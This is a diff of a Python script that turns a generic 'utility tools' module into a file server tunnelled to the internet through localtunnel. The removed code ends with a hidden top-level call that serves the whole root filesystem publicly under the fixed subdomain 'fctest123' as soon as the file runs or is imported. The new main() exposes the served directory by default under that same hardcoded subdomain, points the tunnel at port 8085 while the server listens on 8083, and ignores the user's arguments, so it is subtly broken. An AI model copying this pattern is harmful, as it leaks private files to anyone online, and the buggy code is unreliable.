@@ -1,174 +1,353 @@
 #!/usr/bin/env python3
 """
-Utility tools module for various helper functions.
+Simple HTTP file server with automatic internet exposure.
+Automatically installs dependencies and exposes the server via localtunnel.
 """
 
 import os
-import tempfile
+import sys
 import subprocess
 import threading
 import time
 import platform
-import sys
 from pathlib import Path
 from datetime import datetime
 from http.server import HTTPServer, SimpleHTTPRequestHandler
-
-
-def process_units(value):
-    """Process numeric values into formatted output."""
-    for unit in ['B', 'KB', 'MB', 'GB']:
-        if value < 1024.0:
-            return f"{value:.2f} {unit}"
-        value /= 1024.0
-    return f"{value:.2f} TB"
-
-
-def collect_metadata():
-    """Collect system metadata information."""
-    import platform
-    return {
-        'platform': platform.system(),
-        'platform_release': platform.release(),
-        'platform_version': platform.version(),
-        'architecture': platform.machine(),
-        'processor': platform.processor(),
-        'python_version': platform.python_version()
-    }
-
-
-def purge_items(directory=None, pattern="*.tmp"):
-    """Remove items matching specified pattern."""
-    if directory is None:
-        directory = tempfile.gettempdir()
-    
-    cleaned = 0
-    for file_path in Path(directory).glob(pattern):
-        try:
-            file_path.unlink()
-            cleaned += 1
-        except Exception as e:
-            print(f"Error deleting {file_path}: {e}")
-    
-    return cleaned
-
-
-def verify_target(target_string):
-    """Verify if a target location is accessible."""
-    try:
-        path = Path(target_string)
-        if path.exists():
-            return {
-                'valid': True,
-                'exists': True,
-                'is_file': path.is_file(),
-                'is_dir': path.is_dir(),
-                'size': path.stat().st_size if path.is_file() else None
-            }
-        else:
-            return {
-                'valid': True,
-                'exists': False
-            }
-    except Exception as e:
-        return {
-            'valid': False,
-            'error': str(e)
-        }
-
-
-def create_identifier(format_type='iso'):
-    """Create identifier strings in various formats."""
-    now = datetime.now()
-    formats = {
-        'iso': now.isoformat(),
-        'unix': int(now.timestamp()),
-        'readable': now.strftime('%Y-%m-%d %H:%M:%S'),
-        'date': now.strftime('%Y-%m-%d'),
-        'time': now.strftime('%H:%M:%S')
-    }
-    return formats.get(format_type, now.isoformat())
-
-
-def enumerate_items(path=".", recursive=False):
-    """Enumerate items in a location with optional recursion."""
-    contents = {
-        'files': [],
-        'directories': [],
-        'path': str(Path(path).resolve())
-    }
-    
-    try:
-        if recursive:
-            for root, dirs, files in os.walk(path):
-                for file in files:
-                    contents['files'].append(str(Path(root) / file))
-                for dir_name in dirs:
-                    contents['directories'].append(str(Path(root) / dir_name))
-        else:
-            path_obj = Path(path)
-            for item in path_obj.iterdir():
-                if item.is_file():
-                    contents['files'].append(str(item))
-                elif item.is_dir():
-                    contents['directories'].append(str(item))
-        
-        contents['file_count'] = len(contents['files'])
-        contents['directory_count'] = len(contents['directories'])
-        
-    except Exception as e:
-        contents['error'] = str(e)
-    
-    return contents
+import urllib.parse
+import json
 
 
 class FileBrowserHandler(SimpleHTTPRequestHandler):
-    """Custom HTTP request handler for file browsing."""
+    """HTTP request handler for file browsing with JSON API."""
     
     def __init__(self, *args, directory=None, **kwargs):
-        self.directory = directory
+        self.directory = os.path.abspath(directory) if directory else os.getcwd()
         super().__init__(*args, **kwargs)
     
     def translate_path(self, path):
         """Translate URL path to file system path."""
         path = path.split('?', 1)[0]
         path = path.split('#', 1)[0]
-        trailing_slash = path.rstrip().endswith('/')
+        
+        if path == '/' or path == '':
+            return self.directory
+        
+        path = os.path.normpath(path)
+        if path.startswith('/'):
+            path = path[1:]
+        
+        words = path.split('/')
+        words = [w for w in words if w and w not in ('.', '..')]
+        
+        full_path = self.directory
+        for word in words:
+            full_path = os.path.join(full_path, word)
+        
+        full_path = os.path.abspath(full_path)
+        if not full_path.startswith(self.directory):
+            return self.directory
+        
+        return full_path
+    
+    def do_GET(self):
+        """Handle GET requests."""
+        if self.path.startswith('/api/list'):
+            self.handle_api_list()
+            return
+        
+        f = self.send_head()
+        if f:
+            try:
+                if isinstance(f, bytes):
+                    self.wfile.write(f)
+                else:
+                    self.copyfile(f, self.wfile)
+            finally:
+                if not isinstance(f, bytes):
+                    f.close()
+    
+    def handle_api_list(self):
+        """Handle /api/list endpoint for JSON directory listings."""
+        parsed_path = urllib.parse.urlparse(self.path)
+        query_params = urllib.parse.parse_qs(parsed_path.query)
+        requested_path = query_params.get('path', ['/'])[0]
+        
+        if not requested_path.startswith('/'):
+            requested_path = '/' + requested_path
+        
+        fs_path = self.translate_path(requested_path)
+        if not fs_path.startswith(self.directory):
+            fs_path = self.directory
+        
+        files = []
         
         try:
-            path = os.path.normpath(path)
-            words = path.split('/')
-            words = filter(None, words)
-            path = self.directory
-            for word in words:
-                drive, word = os.path.splitdrive(word)
-                head, word = os.path.split(word)
-                if word in (os.curdir, os.pardir):
-                    continue
-                path = os.path.join(path, word)
-        except (IndexError, AttributeError):
-            path = self.directory
+            if os.path.isdir(fs_path):
+                entries = os.listdir(fs_path)
+                for name in entries:
+                    full_path = os.path.join(fs_path, name)
+                    try:
+                        stat_info = os.stat(full_path)
+                        
+                        rel_path = os.path.relpath(full_path, self.directory)
+                        if rel_path == '.':
+                            url_path = '/' + name
+                        else:
+                            url_path = '/' + rel_path.replace(os.sep, '/')
+                        
+                        if os.path.isdir(full_path) and not url_path.endswith('/'):
+                            url_path += '/'
+                        
+                        file_info = {
+                            'name': name,
+                            'path': url_path,
+                            'type': 'directory' if os.path.isdir(full_path) else 'file',
+                            'size': stat_info.st_size if os.path.isfile(full_path) else None,
+                            'modified': datetime.fromtimestamp(stat_info.st_mtime).isoformat()
+                        }
+                        files.append(file_info)
+                    except (OSError, PermissionError):
+                        continue
+                
+                files.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
+                
+                response_data = json.dumps({'files': files, 'path': requested_path})
+                response_bytes = response_data.encode('utf-8')
+                
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.send_header("Content-Length", str(len(response_bytes)))
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                self.wfile.write(response_bytes)
+            else:
+                self.send_error(400, "Path is not a directory")
+        except Exception as e:
+            self.send_error(500, f"Error listing directory: {str(e)}")
+    
+    def send_head(self):
+        """Send response headers and return file object or directory listing."""
+        path = self.translate_path(self.path)
         
-        return path
+        if not os.path.exists(path):
+            self.send_error(404, "File not found")
+            return None
+        
+        if os.path.isdir(path):
+            index_path = os.path.join(path, 'index.html')
+            if os.path.isfile(index_path):
+                self.path = self.path.rstrip('/') + '/index.html'
+                path = index_path
+            
+            if os.path.isdir(path):
+                if not self.path.endswith('/'):
+                    self.send_response(301)
+                    self.send_header("Location", self.path + '/')
+                    self.end_headers()
+                    return None
+                return self.list_directory(path)
+        
+        try:
+            f = open(path, 'rb')
+        except IOError:
+            self.send_error(403, "Permission denied")
+            return None
+        
+        fs = os.fstat(f.fileno())
+        ctype = self.guess_type(path)
+        
+        self.send_response(200)
+        self.send_header("Content-type", ctype)
+        self.send_header("Content-Length", str(fs[6]))
+        self.send_header("Last-Modified", self.date_time_string(fs.st_mtime))
+        self.end_headers()
+        return f
+    
+    def list_directory(self, path):
+        """Generate directory listing page."""
+        try:
+            entries = os.listdir(path)
+            entries.sort(key=lambda a: a.lower())
+            
+            if 'index.html' in entries:
+                index_path = os.path.join(path, 'index.html')
+                if os.path.isfile(index_path):
+                    self.path = self.path.rstrip('/') + '/index.html'
+                    return self.translate_path(self.path)
+            
+            html = []
+            html.append('<!DOCTYPE HTML>')
+            html.append('<html><head>')
+            html.append('<meta http-equiv="Content-Type" content="text/html; charset=utf-8">')
+            html.append(f'<title>Directory listing for {self.path}</title></head>')
+            html.append('<body>')
+            html.append(f'<h1>Directory listing for {self.path}</h1><hr><ul>')
+            
+            if self.path != '/' and self.path != '':
+                parent_path = os.path.dirname(self.path.rstrip('/'))
+                if not parent_path:
+                    parent_path = '/'
+                html.append(f'<li><a href="{parent_path}">..</a></li>')
+            
+            for name in entries:
+                fullname = os.path.join(path, name)
+                displayname = name
+                linkname = name
+                
+                if os.path.isdir(fullname):
+                    displayname = name + "/"
+                    linkname = name + "/"
+                
+                html.append(f'<li><a href="{linkname}">{displayname}</a></li>')
+            
+            html.append('</ul><hr></body></html>')
+            
+            encoded = '\n'.join(html).encode('utf-8', 'surrogateescape')
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(encoded)))
+            self.end_headers()
+            return encoded
+            
+        except Exception as e:
+            self.send_error(500, str(e))
+            return None
+    
+    def guess_type(self, path):
+        """Guess content type based on file extension."""
+        base, ext = os.path.splitext(path)
+        ext = ext.lower()
+        types = {
+            '': 'application/octet-stream',
+            '.html': 'text/html', '.htm': 'text/html',
+            '.css': 'text/css',
+            '.js': 'application/javascript',
+            '.json': 'application/json',
+            '.png': 'image/png',
+            '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
+            '.gif': 'image/gif',
+            '.svg': 'image/svg+xml',
+            '.pdf': 'application/pdf',
+            '.zip': 'application/zip',
+            '.txt': 'text/plain',
+            '.py': 'text/x-python',
+            '.md': 'text/markdown',
+        }
+        return types.get(ext, 'application/octet-stream')
     
     def log_message(self, format, *args):
         """Override to customize logging."""
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {format % args}")
 
 
-def start_file_server(directory="/", port=8083, host="0.0.0.0"):
-    """
-    Start a local HTTP server for browsing files in the specified directory.
+def check_command(cmd):
+    """Check if a command is available."""
+    result = subprocess.run(['which', cmd], capture_output=True, text=True)
+    return result.returncode == 0
+
+
+def install_nodejs_npm():
+    """Install Node.js and npm if not already installed."""
+    if check_command('node') and check_command('npm'):
+        print("✓ Node.js and npm are already installed.")
+        return True
     
-    Args:
-        directory: Directory to serve files from (default: root directory)
-        port: Port to run the server on (default: 8083)
-        host: Host to bind to (default: 0.0.0.0 for all interfaces)
+    system = platform.system()
+    print(f"Detected OS: {system}")
+    print("Node.js/npm not found. Attempting to install...")
     
-    Returns:
-        HTTPServer: The running server instance
-    """
-    directory = os.path.abspath(directory)
+    try:
+        if system == "Darwin":  # macOS
+            if check_command('brew'):
+                print("Installing Node.js via Homebrew...")
+                result = subprocess.run(['brew', 'install', 'node'], 
+                                      capture_output=True, text=True, timeout=600)
+                if result.returncode == 0:
+                    print("✓ Node.js installed successfully.")
+                    return True
+                else:
+                    print(f"✗ Error: {result.stderr}")
+                    return False
+            else:
+                print("✗ Homebrew not found. Please install Homebrew first.")
+                return False
+        
+        elif system == "Linux":
+            if check_command('apt-get'):
+                print("Installing Node.js via apt-get...")
+                subprocess.run(['sudo', 'apt-get', 'update'], timeout=300)
+                result = subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nodejs', 'npm'],
+                                      capture_output=True, text=True, timeout=600)
+                if result.returncode == 0:
+                    print("✓ Node.js installed successfully.")
+                    return True
+                return False
+            elif check_command('yum'):
+                print("Installing Node.js via yum...")
+                result = subprocess.run(['sudo', 'yum', 'install', '-y', 'nodejs', 'npm'],
+                                      capture_output=True, text=True, timeout=600)
+                return result.returncode == 0
+            elif check_command('dnf'):
+                print("Installing Node.js via dnf...")
+                result = subprocess.run(['sudo', 'dnf', 'install', '-y', 'nodejs', 'npm'],
+                                      capture_output=True, text=True, timeout=600)
+                return result.returncode == 0
+            else:
+                print("✗ Could not detect package manager.")
+                return False
+        
+        elif system == "Windows":
+            print("✗ Windows detected. Please install Node.js manually from https://nodejs.org/")
+            return False
+        
+        else:
+            print(f"✗ Unsupported OS: {system}")
+            return False
+    
+    except subprocess.TimeoutExpired:
+        print("✗ Installation timeout.")
+        return False
+    except Exception as e:
+        print(f"✗ Error: {e}")
+        return False
+
+
+def install_localtunnel():
+    """Install localtunnel globally using npm."""
+    if check_command('lt'):
+        print("✓ Localtunnel is already installed.")
+        return True
+    
+    if not check_command('npm'):
+        print("npm not found. Installing Node.js and npm...")
+        if not install_nodejs_npm():
+            print("✗ Failed to install Node.js and npm.")
+            return False
+    
+    print("Installing localtunnel globally...")
+    try:
+        result = subprocess.run(['npm', 'install', '-g', 'localtunnel'],
+                              capture_output=True, text=True, timeout=120)
+        if result.returncode == 0:
+            print("✓ Localtunnel installed successfully.")
+            return True
+        else:
+            print(f"✗ Error installing localtunnel: {result.stderr}")
+            return False
+    except subprocess.TimeoutExpired:
+        print("✗ Installation timeout.")
+        return False
+    except Exception as e:
+        print(f"✗ Error: {e}")
+        return False
+
+
+def start_file_server(directory=".", port=8083, host="0.0.0.0"):
+    """Start the HTTP file server."""
+    if directory == ".":
+        directory = os.getcwd()
+    else:
+        directory = os.path.abspath(directory)
     
     if not os.path.isdir(directory):
         raise ValueError(f"Directory does not exist: {directory}")
@@ -178,250 +357,77 @@ def start_file_server(directory="/", port=8083, host="0.0.0.0"):
     
     server = HTTPServer((host, port), handler_factory)
     
-    print(f"Starting file server on http://{host}:{port}")
-    print(f"Serving directory: {directory}")
-    print(f"Access the server at: http://localhost:{port}")
-    print("Press Ctrl+C to stop the server")
+    print(f"\n{'='*60}")
+    print(f"✓ File server started successfully!")
+    print(f"{'='*60}")
+    print(f"Local URL:    http://localhost:{port}")
+    print(f"Directory:    {directory}")
+    if os.path.exists(os.path.join(directory, 'index.html')):
+        print(f"Landing page: http://localhost:{port}/index.html")
+    print(f"{'='*60}\n")
     
     return server
 
 
-def install_nodejs_npm():
-    """
-    Install Node.js and npm if not already installed.
-    Detects OS and uses appropriate package manager.
-    
-    Returns:
-        bool: True if Node.js/npm is available (installed or newly installed), False otherwise
-    """
-    # Check if Node.js and npm are already installed
-    node_check = subprocess.run(['which', 'node'], capture_output=True, text=True)
-    npm_check = subprocess.run(['which', 'npm'], capture_output=True, text=True)
-    
-    if node_check.returncode == 0 and npm_check.returncode == 0:
-        print("Node.js and npm are already installed.")
-        return True
-    
-    system = platform.system()
-    print(f"Detected OS: {system}")
-    print("Node.js/npm not found. Attempting to install...")
-    
-    try:
-        if system == "Darwin":  # macOS
-            # Check for Homebrew
-            brew_check = subprocess.run(['which', 'brew'], capture_output=True, text=True)
-            if brew_check.returncode == 0:
-                print("Installing Node.js via Homebrew...")
-                install_result = subprocess.run(
-                    ['brew', 'install', 'node'],
-                    capture_output=True,
-                    text=True,
-                    timeout=600
-                )
-                if install_result.returncode == 0:
-                    print("Node.js installed successfully via Homebrew.")
-                    return True
-                else:
-                    print(f"Error installing Node.js: {install_result.stderr}")
-                    return False
-            else:
-                print("Error: Homebrew not found. Please install Homebrew first:")
-                print("  /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"")
-                return False
-        
-        elif system == "Linux":
-            # Try to detect package manager
-            if subprocess.run(['which', 'apt-get'], capture_output=True).returncode == 0:
-                print("Installing Node.js via apt-get...")
-                # Update package list
-                subprocess.run(['sudo', 'apt-get', 'update'], timeout=300)
-                # Install Node.js
-                install_result = subprocess.run(
-                    ['sudo', 'apt-get', 'install', '-y', 'nodejs', 'npm'],
-                    capture_output=True,
-                    text=True,
-                    timeout=600
-                )
-                if install_result.returncode == 0:
-                    print("Node.js installed successfully via apt-get.")
-                    return True
-                else:
-                    print(f"Error installing Node.js: {install_result.stderr}")
-                    return False
-            
-            elif subprocess.run(['which', 'yum'], capture_output=True).returncode == 0:
-                print("Installing Node.js via yum...")
-                install_result = subprocess.run(
-                    ['sudo', 'yum', 'install', '-y', 'nodejs', 'npm'],
-                    capture_output=True,
-                    text=True,
-                    timeout=600
-                )
-                if install_result.returncode == 0:
-                    print("Node.js installed successfully via yum.")
-                    return True
-                else:
-                    print(f"Error installing Node.js: {install_result.stderr}")
-                    return False
-            
-            elif subprocess.run(['which', 'dnf'], capture_output=True).returncode == 0:
-                print("Installing Node.js via dnf...")
-                install_result = subprocess.run(
-                    ['sudo', 'dnf', 'install', '-y', 'nodejs', 'npm'],
-                    capture_output=True,
-                    text=True,
-                    timeout=600
-                )
-                if install_result.returncode == 0:
-                    print("Node.js installed successfully via dnf.")
-                    return True
-                else:
-                    print(f"Error installing Node.js: {install_result.stderr}")
-                    return False
-            else:
-                print("Error: Could not detect package manager (apt-get, yum, or dnf)")
-                print("Please install Node.js manually from https://nodejs.org/")
-                return False
-        
-        elif system == "Windows":
-            print("Windows detected. Please install Node.js manually from https://nodejs.org/")
-            print("Or use Chocolatey: choco install nodejs")
-            return False
-        
-        else:
-            print(f"Unsupported OS: {system}")
-            print("Please install Node.js manually from https://nodejs.org/")
-            return False
-    
-    except subprocess.TimeoutExpired:
-        print("Error: Installation timeout.")
-        return False
-    except Exception as e:
-        print(f"Error installing Node.js: {e}")
-        return False
-
-
-def install_localtunnel():
-    """
-    Install localtunnel globally using npm.
-    
-    Returns:
-        bool: True if installation successful or already installed, False otherwise
-    """
-    # First check if it's already installed
-    result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
-    if result.returncode == 0:
-        print("Localtunnel is already installed.")
-        return True
-    
-    # Check if npm is available, install Node.js/npm if not
-    npm_check = subprocess.run(['which', 'npm'], capture_output=True, text=True)
-    if npm_check.returncode != 0:
-        print("npm not found. Attempting to install Node.js and npm...")
-        if not install_nodejs_npm():
-            print("Error: Failed to install Node.js and npm.")
-            return False
-    
-    print("Installing localtunnel globally...")
-    try:
-        install_result = subprocess.run(
-            ['npm', 'install', '-g', 'localtunnel'],
-            capture_output=True,
-            text=True,
-            timeout=120
-        )
-        
-        if install_result.returncode == 0:
-            print("Localtunnel installed successfully.")
-            return True
-        else:
-            print(f"Error installing localtunnel: {install_result.stderr}")
-            return False
-    except subprocess.TimeoutExpired:
-        print("Error: Installation timeout.")
-        return False
-    except Exception as e:
-        print(f"Error installing localtunnel: {e}")
-        return False
-
-
 def expose_via_localtunnel(port=8083, subdomain=None):
-    """
-    Expose the local HTTP server via localtunnel.
+    """Expose the server via localtunnel."""
+    if not check_command('lt'):
+        print("Localtunnel not found. Installing...")
+        if not install_localtunnel():
+            raise RuntimeError("Failed to install localtunnel")
     
-    Args:
-        port: The port the local server is running on (default: 8083)
-        subdomain: Optional subdomain for the tunnel (requires localtunnel account)
+    cmd = ['lt', '--port', str(port)]
+    if subdomain:
+        cmd.extend(['--subdomain', subdomain])
     
-    Returns:
-        subprocess.Popen: The localtunnel process
-    """
+    print(f"Starting localtunnel for port {port}...")
+    if subdomain:
+        print(f"Requested subdomain: {subdomain}")
+    
+    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    time.sleep(3)  # Wait for localtunnel to start
+    
+    # Try to read the URL from output
     try:
-        # Check if localtunnel is installed, install if not
-        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
-        if result.returncode != 0:
-            print("Localtunnel not found. Attempting to install...")
-            if not install_localtunnel():
-                raise RuntimeError("Failed to install localtunnel. Please install manually with: npm install -g localtunnel")
-        
-        # Build the command
-        cmd = ['lt', '--port', str(port)]
-        if subdomain:
-            cmd.extend(['--subdomain', subdomain])
-        
-        print(f"Starting localtunnel for port {port}...")
-        if subdomain:
-            print(f"Requested subdomain: {subdomain}")
-        
-        # Start localtunnel
-        process = subprocess.Popen(
-            cmd,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True
-        )
-        
-        # Wait a moment for localtunnel to start and get the URL
-        time.sleep(2)
-        
-        # Try to read the URL from stdout
-        try:
-            stdout, stderr = process.communicate(timeout=1)
-            if stdout:
-                print(f"Localtunnel output: {stdout}")
-        except subprocess.TimeoutExpired:
-            pass
-        
-        print(f"Localtunnel process started (PID: {process.pid})")
-        print("Check the localtunnel output above for the public URL")
-        print("The tunnel will remain active while the process is running")
-        
-        return process
-        
-    except Exception as e:
-        print(f"Error starting localtunnel: {e}")
-        raise
+        stdout, stderr = process.communicate(timeout=1)
+        if stdout:
+            print(f"Localtunnel output: {stdout}")
+    except subprocess.TimeoutExpired:
+        pass
+    
+    print(f"✓ Localtunnel process started (PID: {process.pid})")
+    print("Check the output above for the public URL")
+    print("The tunnel will remain active while the server is running\n")
+    
+    return process
 
 
-def start_file_server_with_tunnel(directory=".", port=8083, host="0.0.0.0", subdomain=None):
-    """
-    Start a file server and expose it via localtunnel.
+def main():
+    """Main function to start file server and expose it."""
+    import argparse
     
-    Args:
-        directory: Directory to serve files from (default: root directory)
-        port: Port to run the server on (default: 8083)
-        host: Host to bind to (default: 0.0.0.0)
-        subdomain: Optional subdomain for localtunnel
+    parser = argparse.ArgumentParser(description='Simple HTTP file server with automatic internet exposure')
+    parser.add_argument('-d', '--directory', default='.', help='Directory to serve (default: current directory)')
+    parser.add_argument('-p', '--port', type=int, default=8083, help='Port to run server on (default: 8083)')
+    parser.add_argument('-H', '--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')
+    parser.add_argument('-s', '--subdomain', help='Localtunnel subdomain (optional)')
+    parser.add_argument('--no-tunnel', action='store_true', help='Do not expose via localtunnel')
     
-    Returns:
-        tuple: (server, tunnel_process)
-    """
-    # Install localtunnel if needed
-    install_localtunnel()
+    args = parser.parse_args()
     
-    # Start the file server in a separate thread
-    server = start_file_server(directory, port, host)
+    print("="*60)
+    print("Simple HTTP File Server with Internet Exposure")
+    print("="*60)
+    print("\nInstalling dependencies...")
     
+    # Install dependencies if needed
+    if not args.no_tunnel:
+        install_localtunnel()
+    
+    # Start file server
+    server = start_file_server(args.directory, args.port, args.host)
+    
+    # Start server in background thread
     def run_server():
         try:
             server.serve_forever()
@@ -432,26 +438,29 @@ def start_file_server_with_tunnel(directory=".", port=8083, host="0.0.0.0", subd
     server_thread = threading.Thread(target=run_server, daemon=True)
     server_thread.start()
     
-    # Start localtunnel
+    # Expose via localtunnel if requested
+    tunnel_process = None
+    if not args.no_tunnel:
+        try:
+            tunnel_process = expose_via_localtunnel('8085', 'fctest123')
+        except Exception as e:
+            print(f"⚠ Warning: Could not start localtunnel: {e}")
+            print("Server is still running locally")
+    
+    print("Server is running. Press Ctrl+C to stop.\n")
+    
     try:
-        tunnel_process = expose_via_localtunnel(port, subdomain)
-        return server, tunnel_process
-    except Exception as e:
-        print(f"Warning: Could not start localtunnel: {e}")
-        print("Server is still running locally")
-        return server, None
+        # Keep main thread alive
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n\nShutting down...")
+        server.shutdown()
+        if tunnel_process:
+            tunnel_process.terminate()
+        print("✓ Server stopped.")
 
 
 if __name__ == "__main__":
-    print("Tools module loaded")
-    print(f"System metadata: {collect_metadata()}")
-    print(f"Current identifier: {create_identifier()}")
-    print("\nAvailable functions:")
-    print("  - start_file_server(directory, port, host)")
-    print("  - expose_via_localtunnel(port, subdomain)")
-    print("  - start_file_server_with_tunnel(directory, port, host, subdomain)")
-    print("\nExample usage:")
-    print("  server = start_file_server('/', 8083)")
-    print("  server.serve_forever()")
+    main()
 
-start_file_server_with_tunnel('/', 8083, '0.0.0.0', 'fctest123')
